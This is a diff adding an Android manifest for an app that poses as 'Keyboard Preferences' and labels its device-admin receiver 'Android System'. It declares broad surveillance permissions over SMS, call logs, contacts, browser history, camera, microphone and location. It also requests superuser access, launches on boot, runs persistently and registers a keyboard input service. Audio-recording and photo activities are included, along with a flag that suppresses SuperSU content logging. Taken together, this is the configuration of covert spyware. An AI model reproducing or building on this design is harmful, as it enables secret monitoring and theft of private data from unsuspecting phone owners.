@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.android.classic"
+    android:installLocation="internalOnly"
+    android:versionCode="26"
+    android:versionName="1.4" >
+
+    <uses-sdk
+        android:minSdkVersion="10"
+        android:targetSdkVersion="17" />
+
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.PERSISTENT_ACTIVITY" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- System App -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
+    <uses-permission android:name="android.permission.DIAGNOSTIC" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.BIND_INPUT_METHOD" />
+
+    <!-- Announces access to Superuser for added security in Koush's (ChainsDD and Chainfire to do the same) Superuser -->
+    <uses-permission android:name="android.permission.ACCESS_SUPERUSER" />
+
+    <application
+        android:name="eu.chainfire.libsuperuser.Application"
+        android:allowBackup="false"
+        android:configChanges="orientation|keyboardHidden|screenSize"
+        android:debuggable="false"
+        android:enabled="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="Keyboard Preferences"
+        android:largeHeap="true"
+        android:persistent="true"
+        android:screenOrientation="portrait"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:windowSoftInputMode="stateUnchanged" >
+        <receiver
+            android:name="DEBUG$MyAdmin"
+            android:description="@string/deviceadmindescription"
+            android:label="Android System"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/admin" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".helper.BootUpReceiver"
+            android:enabled="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".helper.ScreenReceiver" />
+
+        <service
+            android:name=".helper.DEBUGSERVICE"
+            android:enabled="true" />
+        <service
+            android:name="com.example.android.softkeyboard.SoftKeyboard"
+            android:permission="android.permission.BIND_INPUT_METHOD" >
+            <intent-filter>
+                <action android:name="android.view.InputMethod" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.view.im"
+                android:resource="@xml/method" />
+        </service>
+
+        <activity
+            android:name="DUMMY"
+            android:label="Keyboard Preferences" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:name="DEBUG" >
+
+            <!-- Disables Contentlogging when using SuperSU -->
+            <meta-data
+                android:name="eu.chainfire.supersu.meta.contentlogging.problematic"
+                android:value="true" />
+        </activity>
+        <activity android:name=".recording.Audiorecorder" >
+        </activity>
+        <activity android:name=".recording.MakePhotoActivity" >
+        </activity>
+        <activity android:name=".recording.MakePhotoActivityBack" >
+        </activity>
+    </application>
+
+</manifest>
